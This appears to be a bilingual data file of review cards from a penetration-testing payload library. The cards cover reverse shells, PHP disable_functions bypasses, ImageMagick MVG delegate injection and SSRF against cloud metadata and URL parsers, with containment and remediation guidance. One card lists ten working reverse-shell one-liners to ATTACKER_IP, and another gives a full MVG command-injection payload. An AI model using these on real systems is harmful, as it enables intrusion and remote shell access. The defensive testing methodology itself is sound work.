overview.en: Multi-Language Reverse-Shell Command Reference is intended for this boundary: All ten lines are complete commands run after execution capability exists and lack parameter closure, request position, or interpreter-escape conditions. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 原记录把后利用回连命令与发现命令注入的 Payload 混淆；回连成功只证明已有执行与出站网络，不定位漏洞入口。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The source confuses post-exploitation callback commands with payloads that discover command injection; a callback proves existing execution and egress, not the vulnerable entry point. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 按语言和 Netcat 行索引迁入现有反弹 Shell 工具卡，保留占位符、平台条件和监听端前置要求。 工具验证需记录目标解释器、出站连接和父进程；命令注入结论仍由独立无害标记探针与请求关联提供。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Route line indexes by language and Netcat into existing reverse-shell tool cards while retaining placeholders, platform constraints, and listener prerequisites. Tool validation records the interpreter, outbound connection, and parent process, while command-injection proof still comes from a separate harmless marker correlated to a request. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 迁移后 Payload 库只保留入口级 Shell 语法；工具卡明确允许的回连地址、监听端、审计与清理步骤。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: After migration, keep only entry-level shell syntax in the payload library and document allowed callback destinations, listeners, auditing, and cleanup in tool cards. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认反向 Shell 命令目录适用边界
title.en: Confirm the Reverse-Shell Command Catalog boundary

description.zh: 10 行都是获得执行能力之后运行的完整 CLI，缺少参数闭合、请求位置或解释器逃逸条件，不能作为独立 RCE 证明。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: All ten lines are complete commands run after execution capability exists and lack parameter closure, request position, or interpreter-escape conditions. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控反向 Shell 命令目录样例
title.en: Submit a controlled Reverse-Shell Command Catalog case

description.zh: 按语言和 Netcat 行索引迁入现有反弹 Shell 工具卡，保留占位符、平台条件和监听端前置要求。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Route line indexes by language and Netcat into existing reverse-shell tool cards while retaining placeholders, platform constraints, and listener prerequisites. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444;sh <&196 >&196 2>&196

title.zh: 核对反向 Shell 命令目录证据
title.en: Verify Reverse-Shell Command Catalog evidence

description.zh: 工具验证需记录目标解释器、出站连接和父进程；命令注入结论仍由独立无害标记探针与请求关联提供。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Tool validation records the interpreter, outbound connection, and parent process, while command-injection proof still comes from a separate harmless marker correlated to a request. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归反向 Shell 命令目录
title.en: Remediate and regress Reverse-Shell Command Catalog

description.zh: 迁移后 Payload 库只保留入口级 Shell 语法；工具卡明确允许的回连地址、监听端、审计与清理步骤。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: After migration, keep only entry-level shell syntax in the payload library and document allowed callback destinations, listeners, auditing, and cleanup in tool cards. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 这是按语言组织的完整反弹 Shell CLI 目录，应迁往现有工具命令。

prerequisites.zh: 已分别确认 Linux FFI、Windows COM 和环境变量/Shellshock 三条路径的平台、扩展与下游组件版本。
prerequisites.en: Separately confirm platform, extension, and downstream-component versions for Linux FFI, Windows COM, and environment-variable or Shellshock paths.

prerequisites.zh: 在隔离 PHP 实例中使用只写固定标记的函数，并可观察扩展调用、子进程与环境传播日志。
prerequisites.en: Use marker-only functions in an isolated PHP instance and observe extension calls, child processes, and environment propagation.

analysis.zh: FFI 阳性需出现实际 native 调用，COM 阳性需出现 WScript.Shell 派生进程，环境路径需由脆弱下游组件解释函数文本。仅 FFI/COM 类存在、putenv 成功、或 PHP 解析代码都不是执行绕过。
analysis.en: FFI requires an actual native call, COM requires a child process from WScript.Shell, and the environment path requires a vulnerable downstream component to interpret the function text. Class availability, successful putenv, or PHP parsing alone are not execution bypasses.

opsecTips.zh: 任一机制首次生成无害标记后停止，不执行 `cat /etc/passwd`、whoami 或跨平台替代路径。
opsecTips.en: Stop after the first harmless marker from any mechanism and do not execute `cat /etc/passwd`, whoami, or cross-platform alternatives.

opsecTips.zh: 关闭测试 FFI/COM 配置，清理环境变量、子进程和标记文件，并重启隔离 PHP worker 还原状态。
opsecTips.en: Disable test FFI or COM settings, clear environment variables, child processes, and marker files, and restart the isolated PHP worker to restore state.

name.zh: PHP disable_functions 执行边界绕过

description.zh: 覆盖 FFI、Windows COM 和环境变量/Shellshock 风格路径，验证 PHP 函数禁用是否仍存在外部执行通道。
description.en: Covers FFI, Windows COM, and environment-variable or Shellshock-style paths to test whether external execution remains despite disabled PHP functions.

overview.zh: PHP disable_functions 执行边界绕过用于六行实际分为 FFI、COM 与环境变量三条机制，均需对应 PHP 扩展、平台和下游程序前置条件。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: PHP disable_functions Execution-Boundary Bypass is intended for this boundary: The six lines represent FFI, COM, and environment-variable mechanisms, each with PHP extension, platform, and downstream-program prerequisites. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: disable_functions 只限制 PHP 函数名，若 FFI 可调用 libc、COM 可启动进程或环境变量进入脆弱程序，仍能跨越执行边界。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: disable_functions restricts PHP function names, but enabled FFI, process-capable COM, or environment variables reaching a vulnerable program can still cross the execution boundary. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 先检查扩展和配置，再分别使用无害固定标记测试 FFI 调用、COM 进程和环境变量传递；三条路径不得合并定性。 必须出现对应扩展调用、子进程或脆弱下游组件日志；PHP 代码被解析、对象可创建或变量可设置本身不足。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Inspect extensions and configuration, then separately test FFI calls, COM process creation, and environment propagation with harmless fixed markers. Require evidence of the extension call, child process, or vulnerable downstream component; parsed PHP, object creation, or setting a variable alone is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 关闭生产 FFI 和不需要的 COM，升级 Shellshock 相关组件，以容器/低权限隔离 PHP，并用系统级执行控制替代函数黑名单。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Disable production FFI and unnecessary COM, patch Shellshock-related components, isolate PHP with containers and least privilege, and use system-level execution controls instead of a function blacklist. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认PHP 执行限制绕过适用边界
title.en: Confirm the PHP Execution-Restriction Bypass boundary

description.zh: 六行实际分为 FFI、COM 与环境变量三条机制，均需对应 PHP 扩展、平台和下游程序前置条件。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The six lines represent FFI, COM, and environment-variable mechanisms, each with PHP extension, platform, and downstream-program prerequisites. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控PHP 执行限制绕过样例
title.en: Submit a controlled PHP Execution-Restriction Bypass case

description.zh: 先检查扩展和配置，再分别使用无害固定标记测试 FFI 调用、COM 进程和环境变量传递；三条路径不得合并定性。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Inspect extensions and configuration, then separately test FFI calls, COM process creation, and environment propagation with harmless fixed markers. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对PHP 执行限制绕过证据
title.en: Verify PHP Execution-Restriction Bypass evidence

description.zh: 必须出现对应扩展调用、子进程或脆弱下游组件日志；PHP 代码被解析、对象可创建或变量可设置本身不足。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Require evidence of the extension call, child process, or vulnerable downstream component; parsed PHP, object creation, or setting a variable alone is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归PHP 执行限制绕过
title.en: Remediate and regress PHP Execution-Restriction Bypass

description.zh: 关闭生产 FFI 和不需要的 COM，升级 Shellshock 相关组件，以容器/低权限隔离 PHP，并用系统级执行控制替代函数黑名单。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Disable production FFI and unnecessary COM, patch Shellshock-related components, isolate PHP with containers and least privilege, and use system-level execution controls instead of a function blacklist. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 这些是跨越 PHP 执行限制的具体代码载荷，不是 PHP CLI 手册。

prerequisites.zh: 目标使用受测版本 ImageMagick 解析完整四行 MVG 文档，并已导出当前 security-policy。
prerequisites.en: The target parses the complete four-line MVG document with the tested ImageMagick version and the current security policy has been exported.

prerequisites.zh: 在无网络低权限沙箱中把 `ls -la` 替换为只创建唯一临时标记的动作，并保留普通图片对照。
prerequisites.en: In a networkless low-privilege sandbox, replace `ls -la` with an action that only creates a unique temporary marker and retain a normal-image control.

analysis.zh: 阳性必须由 ImageMagick 委托进程派生标记动作，并与该 MVG 上传关联。MVG 解析错误、远程图片请求、转换失败或 URL 文字出现在日志中都不等于命令执行。
analysis.en: Positive evidence requires an ImageMagick delegate process to spawn the marker action correlated to the MVG upload. MVG parse errors, remote image requests, conversion failure, or URL text in logs do not equal command execution.

opsecTips.zh: 标记动作首次被委托进程触发后停止，不执行目录枚举、下载器或持久文件写入。
opsecTips.en: Stop after the delegate first triggers the marker action and do not perform directory enumeration, downloads, or persistent file writes.

opsecTips.zh: 删除上传 MVG、转换输出和临时标记，终止委托子进程并恢复/核对 security-policy。
opsecTips.en: Delete the uploaded MVG, conversion output, and marker, terminate delegate children, and restore and verify the security policy.

name.zh: ImageMagick MVG 委托命令注入

description.zh: 使用 MVG fill URL 中的引号与管道打断委托参数，验证图像处理链是否把内容交给 Shell。
description.en: Uses quotes and a pipe inside an MVG fill URL to break delegate arguments and test whether the image-processing chain invokes a shell.

overview.zh: ImageMagick MVG 委托命令注入用于原泛化名称未说明组件；四行构成一份 MVG 文档，必须整体作为单个图像解析输入，而不是四条独立命令。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: ImageMagick MVG Delegate Command Injection is intended for this boundary: The generic source name hid the component; all four lines form one MVG document and must be treated as one image-parser input. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 旧版或不安全 ImageMagick 委托把 MVG URL 拼入 Shell 命令，策略未禁用危险 coder/协议时可从图像内容跨入命令执行。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: Vulnerable or unsafe ImageMagick delegates concatenate an MVG URL into a shell command, allowing image content to reach command execution when policy permits risky coders or protocols. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在隔离实例把命令替换为生成固定临时标记的最小动作，提交完整 MVG，并同时保留普通图片和无管道 MVG 对照。 ImageMagick/委托进程审计与标记文件必须关联同一上传；解析错误、URL 请求或图像转换失败不能单独证明 RCE。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: In isolation, replace the command with a minimal fixed temporary-marker action, submit the complete MVG, and retain a normal image and pipe-free MVG as controls. ImageMagick or delegate process audit and the marker file must correlate to the upload; parse errors, URL requests, or failed conversion alone do not prove RCE. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 升级 ImageMagick，使用严格 security-policy 禁用 MVG、URL 和不需要的委托，在低权限无网络沙箱处理上传文件。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Upgrade ImageMagick, use a strict security policy to disable MVG, URL, and unnecessary delegates, and process uploads in a low-privilege networkless sandbox. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认ImageMagick MVG 注入适用边界
title.en: Confirm the ImageMagick MVG Injection boundary

description.zh: 原泛化名称未说明组件；四行构成一份 MVG 文档，必须整体作为单个图像解析输入，而不是四条独立命令。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The generic source name hid the component; all four lines form one MVG document and must be treated as one image-parser input. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控ImageMagick MVG 注入样例
title.en: Submit a controlled ImageMagick MVG Injection case

description.zh: 在隔离实例把命令替换为生成固定临时标记的最小动作，提交完整 MVG，并同时保留普通图片和无管道 MVG 对照。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: In isolation, replace the command with a minimal fixed temporary-marker action, submit the complete MVG, and retain a normal image and pipe-free MVG as controls. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context

title.zh: 核对ImageMagick MVG 注入证据
title.en: Verify ImageMagick MVG Injection evidence

description.zh: ImageMagick/委托进程审计与标记文件必须关联同一上传；解析错误、URL 请求或图像转换失败不能单独证明 RCE。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: ImageMagick or delegate process audit and the marker file must correlate to the upload; parse errors, URL requests, or failed conversion alone do not prove RCE. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归ImageMagick MVG 注入
title.en: Remediate and regress ImageMagick MVG Injection

description.zh: 升级 ImageMagick，使用严格 security-policy 禁用 MVG、URL 和不需要的委托，在低权限无网络沙箱处理上传文件。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Upgrade ImageMagick, use a strict security policy to disable MVG, URL, and unnecessary delegates, and process uploads in a low-privilege networkless sandbox. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 四行是一个明确组件解析器 Payload，应保留并修正组件名称。

prerequisites.zh: 已根据资产配置确认实际云平台与隔离测试实例，禁止跨 AWS、GCP、Azure、腾讯云批量尝试。
prerequisites.en: Confirm the actual cloud platform and isolated test instance from the asset inventory; do not batch-test AWS, GCP, Azure, and Tencent Cloud.

prerequisites.zh: 选择仅返回实例 ID 等非敏感字段的路径，配置平台要求的令牌/请求头，并启用出站与元数据访问日志。
prerequisites.en: Choose a path returning only a nonsensitive field such as instance ID, configure required tokens or headers, and enable egress and metadata-access logging.

analysis.zh: 阳性是应用服务器携带正确平台前置条件访问元数据端点并返回固定非敏感字段。公网模拟页面、DNS 解析到 metadata 主机、401/403、或仅观察链路本地连接失败均是假阳性；不得以获取凭据作为验证标准。
analysis.en: Positive evidence is the application server reaching the metadata endpoint with platform prerequisites and returning a fixed nonsensitive field. Public simulations, metadata hostname resolution, 401 or 403, and failed link-local connections are false positives; credential retrieval is not a validation criterion.

opsecTips.zh: 收到一个非敏感实例字段后立即停止，不访问 IAM 凭据、user-data、OAuth token 或 Kubernetes 配置。
opsecTips.en: Stop immediately after receiving one nonsensitive instance field and do not access IAM credentials, user data, OAuth tokens, or Kubernetes configuration.

opsecTips.zh: 清理请求日志中的实例标识，撤销临时测试角色/令牌，确认没有缓存元数据响应或自动重试。
opsecTips.en: Redact instance identifiers from request logs, revoke temporary test roles or tokens, and verify no metadata response cache or automatic retry remains.

name.zh: 多云实例元数据 SSRF 探测

description.zh: 覆盖 AWS、Google Cloud、Azure 与腾讯云元数据路径，验证服务端请求是否能到达链路本地凭据和实例信息端点。
description.en: Covers AWS, Google Cloud, Azure, and Tencent Cloud metadata paths to test whether server-side requests reach link-local credential and instance-information endpoints.

overview.zh: 多云实例元数据 SSRF 探测用于各平台要求的主机名、路径、请求头、令牌和版本不同；必须先确认实际云环境，不能把六平台 URL 批量发送。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Multi-Cloud Instance-Metadata SSRF Probes is intended for this boundary: Each platform has distinct hosts, paths, headers, tokens, and versions; identify the actual cloud before sending any one platform-specific URL. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 应用可访问用户指定 URL，且出站网络允许链路本地元数据；未强制 IMDSv2、Metadata-Flavor 等平台防护时可暴露实例身份。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The application fetches user URLs and egress permits link-local metadata; missing platform protections such as IMDSv2 or Metadata-Flavor can expose instance identity. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 在克隆或隔离云实例中只选择对应平台的无敏感实例 ID 路径，使用必需请求头并记录出站连接，不请求凭据正文。 元数据服务日志、出站代理和固定非敏感字段必须共同证明访问；DNS 解析、超时差异或公开文档响应不是证据。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: In a cloned or isolated cloud instance, request only a nonsensitive instance-ID path for the matching platform with required headers and record egress without retrieving credential bodies. Metadata logs, egress proxy records, and a fixed nonsensitive field must jointly prove access; DNS resolution, timeout differences, or public documentation responses are not evidence. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 阻断链路本地出站，使用 URL 允许列表与代理；强制云平台最新元数据保护、最小实例角色，并监控元数据路径请求。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Block link-local egress, use URL allowlists and a proxy, enforce current metadata protections and least-privilege instance roles, and monitor metadata-path requests. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认云元数据端点访问适用边界
title.en: Confirm the Cloud Metadata Endpoint Access boundary

description.zh: 各平台要求的主机名、路径、请求头、令牌和版本不同；必须先确认实际云环境，不能把六平台 URL 批量发送。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Each platform has distinct hosts, paths, headers, tokens, and versions; identify the actual cloud before sending any one platform-specific URL. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控云元数据端点访问样例
title.en: Submit a controlled Cloud Metadata Endpoint Access case

description.zh: 在克隆或隔离云实例中只选择对应平台的无敏感实例 ID 路径，使用必需请求头并记录出站连接，不请求凭据正文。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: In a cloned or isolated cloud instance, request only a nonsensitive instance-ID path for the matching platform with required headers and record egress without retrieving credential bodies. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对云元数据端点访问证据
title.en: Verify Cloud Metadata Endpoint Access evidence

description.zh: 元数据服务日志、出站代理和固定非敏感字段必须共同证明访问；DNS 解析、超时差异或公开文档响应不是证据。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Metadata logs, egress proxy records, and a fixed nonsensitive field must jointly prove access; DNS resolution, timeout differences, or public documentation responses are not evidence. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归云元数据端点访问
title.en: Remediate and regress Cloud Metadata Endpoint Access

description.zh: 阻断链路本地出站，使用 URL 允许列表与代理；强制云平台最新元数据保护、最小实例角色，并监控元数据路径请求。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Block link-local egress, use URL allowlists and a proxy, enforce current metadata protections and least-privilege instance roles, and monitor metadata-path requests. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 这些是按云平台选择的 SSRF 目标 Payload，不是云 CLI。

prerequisites.zh: 已锁定生产使用的 URL 校验器、框架解析器、HTTP 客户端和 DNS 解析路径，并可比较各层结果。
prerequisites.en: Identify the production URL validator, framework parser, HTTP client, and DNS path and compare their results.

prerequisites.zh: 受控外部与回环标记服务均可记录唯一令牌，且每次测试只改变一个地址表示或 URL 组件。
prerequisites.en: Controlled external and loopback marker services can log unique tokens, and each test changes only one address representation or URL component.

analysis.zh: 阳性要求校验阶段认为目标可达外部，而最终 socket 实际连接受阻地址，并由标记服务证实。字符串包含内网 IP、解析器间输出不同但未连接、DNS 查询、或重定向被拒绝都不构成 SSRF。
analysis.en: Positive evidence requires validation to approve an external target while the final socket reaches a blocked address confirmed by the marker service. An internal-looking string, parser disagreement without a connection, DNS lookup, or a rejected redirect does not constitute SSRF.

opsecTips.zh: 首个解析差异形成受控回环连接后停止，不继续测试真实内网、云元数据或第三方 rebinding 域。
opsecTips.en: Stop after the first parser differential creates a controlled loopback connection; do not continue to real internal networks, cloud metadata, or third-party rebinding domains.

opsecTips.zh: 清除 DNS、代理和 HTTP 连接缓存，关闭标记服务，并删除测试域名与唯一令牌的临时记录。
opsecTips.en: Clear DNS, proxy, and HTTP connection caches, shut down marker services, and delete temporary records for test domains and unique tokens.

name.zh: SSRF URL 解析与地址规范化绕过
name.en: SSRF URL Parsing and Address-Canonicalization Bypass

description.zh: 覆盖非规范 IP、IPv6、userinfo、fragment、Unicode、DNS Rebinding 与通配 DNS，验证 URL 检查和连接目标是否一致。
description.en: Covers non-canonical IPs, IPv6, userinfo, fragments, Unicode, DNS rebinding, and wildcard DNS to test whether URL validation matches the connected destination.

overview.zh: SSRF URL 解析与地址规范化绕过用于20 行跨多个解析维度，测试时一次只改变地址表示、userinfo、fragment 或 DNS 行为中的一种。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: SSRF URL Parsing and Address-Canonicalization Bypass is intended for this boundary: The 20 lines span several parser dimensions; change only one of address notation, userinfo, fragment, or DNS behavior at a time. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 安全校验器、框架 URL 类和 HTTP 客户端采用不同解析与规范化规则，导致通过检查的主机最终连接到受阻地址。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A security validator, framework URL class, and HTTP client may parse and canonicalize differently, allowing an approved host string to connect to a blocked address. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 使用与生产相同的解析器离线记录 scheme、host、port 和规范 IP，再向受控回环服务发送单个变体并跟踪重定向与 DNS。 最终 socket 目标与校验阶段地址必须形成可重复差异并有服务日志；字符串包含 127、解析报错或 DNS 查询不构成 SSRF。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: With the production parser, record scheme, host, port, and canonical IP offline, then send one variant to a controlled loopback service and trace redirects and DNS. A repeatable difference between the validated address and final socket destination must be supported by service logs; containing 127, parse errors, or DNS lookup alone is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 单一标准解析器完成规范化，拒绝 userinfo/fragment 混淆与非规范 IP，解析后分类所有地址，并在重定向和每次 DNS 后复检。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Canonicalize with one standard parser, reject userinfo or fragment confusion and non-canonical IPs, classify all resolved addresses, and revalidate after redirects and every DNS lookup. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认URL 解析器差异适用边界
title.en: Confirm the URL Parser Differentials boundary

description.zh: 20 行跨多个解析维度，测试时一次只改变地址表示、userinfo、fragment 或 DNS 行为中的一种。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The 20 lines span several parser dimensions; change only one of address notation, userinfo, fragment, or DNS behavior at a time. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控URL 解析器差异样例
title.en: Submit a controlled URL Parser Differentials case

description.zh: 使用与生产相同的解析器离线记录 scheme、host、port 和规范 IP，再向受控回环服务发送单个变体并跟踪重定向与 DNS。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: With the production parser, record scheme, host, port, and canonical IP offline, then send one variant to a controlled loopback service and trace redirects and DNS. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.
